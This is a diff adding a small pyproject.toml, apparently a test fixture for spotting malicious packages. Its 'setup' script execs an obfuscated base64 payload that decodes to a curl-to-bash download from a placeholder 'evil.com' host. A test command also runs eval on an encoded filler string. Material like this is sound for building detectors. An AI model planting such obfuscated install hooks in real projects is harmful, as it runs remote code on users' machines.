@@ -1,0 +1,13 @@
+[project]
+name = "innocent-project"
+version = "1.0.0"
+
+[project.scripts]
+# This contains a suspiciously long base64 payload
+setup = "python -c \"import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9zdGVhbCB8IGJhc2gnKQ=='))\""
+
+[tool.lint]
+enabled = true
+
+[tool.test]
+command = "eval(atob('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='))"
